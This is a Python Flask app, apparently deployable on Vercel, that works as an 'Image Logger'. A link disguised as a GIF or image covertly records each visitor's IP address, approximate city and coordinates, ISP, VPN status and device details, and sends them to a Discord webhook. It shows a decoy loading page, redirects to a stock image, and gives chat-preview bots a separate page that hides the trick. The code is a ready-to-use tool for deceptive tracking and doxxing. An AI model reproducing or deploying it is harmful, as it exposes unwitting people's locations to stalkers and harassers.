from flask import Flask, request, redirect
import requests
import json
import os
from datetime import datetime
from user_agents import parse

app = Flask(__name__)

# CONFIGURATION (Loaded from Environment Variables in Vercel)
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
CUSTOM_IMAGE_URL = os.environ.get("CUSTOM_IMAGE_URL", "") 

# List of random fallback images
IMAGES = [
    "https://images.unsplash.com/photo-1506744038136-46273834b3fb",
    "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05",
    "https://images.unsplash.com/photo-1441974231531-c6227db76b6e",
    "https://images.unsplash.com/photo-1501785888041-af3ef285b470",
    "https://images.unsplash.com/photo-1493246507139-91e8bef99c02"
]

def get_ip_info(ip):
    try:
        # Added advanced fields: proxy, mobile, currency
        fields = "status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,mobile,currency"
        response = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}")
        return response.json()
    except Exception:
        return None

@app.route('/')
def logger():
    try:
        # 1. Get User-Agent and IP
        user_agent_string = request.headers.get('User-Agent', 'Unknown')
        ip = request.headers.get('x-forwarded-for', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()

        # 2. Check for Bots (Discord, etc.)
        is_bot = any(bot in user_agent_string for bot in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot", "LinkedInBot"])
        
        # 3. Get IP Info
        geo = get_ip_info(ip)
        
        # 4. Handle BOT Case (Discord Link Preview)
        if is_bot:
            # Send "Link Sent" Log
            payload = {
                "username": "Image Logger",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "description": "An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.",
                    "color": 3447003,
                    "fields": [
                        {"name": "Endpoint", "value": "`/api/image`", "inline": False},
                        {"name": "IP", "value": f"`{ip}`", "inline": True},
                        {"name": "Platform", "value": "`Discord`" if "Discord" in user_agent_string else "`Other`", "inline": True}
                    ]
                }]
            }
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
            
            # Return "Loading" page to Discord to prevent preview
            return """
            <html>
            <head><title>Loading...</title></head>
            <body style="background-color: #2f3136; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
                <div style="text-align: center;">
                    <div style="border: 8px solid #444; border-top: 8px solid #5865f2; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
                    <p>Loading Tenor GIF...</p>
                </div>
                <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
            </body>
            </html>
            """

        # 5. Handle HUMAN Case
        ua = parse(user_agent_string)
        os_detail = f"{ua.os.family} {ua.os.version_string}"
        browser_detail = f"{ua.browser.family} {ua.browser.version_string}"
        full_device = f"{ua.os.family} | {ua.browser.family} | {ua.device.family}"

        # Build Detailed Embed
        embed = {
            "title": "Image Logger - IP Logged",
            "description": "A User Opened the Original Image!",
            "color": 3447003,
            "thumbnail": {"url": "https://i.imgur.com/w9fXfM9.png"}, # Tiny icon
            "fields": [
                {"name": "Endpoint", "value": "`/api/image`", "inline": False},
                {"name": "IP Info:", "value": f"```\nIP: {ip}\nProvider: {geo.get('isp', 'Unknown')}\nASN: {geo.get('as', 'Unknown')}\nCountry: {geo.get('country', 'Unknown')}\nRegion: {geo.get('regionName', 'Unknown')}\nCity: {geo.get('city', 'Unknown')}\nCoords: {geo.get('lat', '??')}, {geo.get('lon', '??')} (Approximate)\nTimezone: {geo.get('timezone', 'Unknown')}\nMobile: {'True' if geo.get('mobile') else 'False'}\nVPN: {'True' if geo.get('proxy') else 'False'}\nBot: False\n```", "inline": False},
                {"name": "PC Info:", "value": f"```\nOS: {os_detail}\nBrowser: {browser_detail}\nDetails: {full_device}\n```", "inline": False}
            ],
            "timestamp": datetime.now().isoformat()
        }

        requests.post(WEBHOOK_URL, json={"username": "Image Logger", "embeds": [embed]}, timeout=10)

        # 6. Show Decoy/Loading Page then Redirect
        import random
        redirect_url = CUSTOM_IMAGE_URL if CUSTOM_IMAGE_URL else random.choice(IMAGES)
        
        return f"""
        <html>
        <head>
            <title>Loading...</title>
            <meta http-equiv="refresh" content="2;url={redirect_url}">
        </head>
        <body style="background-color: #2f3136; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
            <div style="text-align: center;">
                <img src="https://i.imgur.com/83pBy9S.gif" width="50" style="margin-bottom: 20px;">
                <h2>Loading GIF...</h2>
                <p>Please wait while the media loads.</p>
            </div>
            <script> setTimeout(() => {{ window.location.href = "{redirect_url}"; }}, 1500); </script>
        </body>
        </html>
        """
        
    except Exception as e:
        import traceback
        return f"DEBUG ERROR: {str(e)}<br><pre>{traceback.format_exc()}</pre>", 500

# For local testing if needed
if __name__ == '__main__':
    app.run(debug=True)
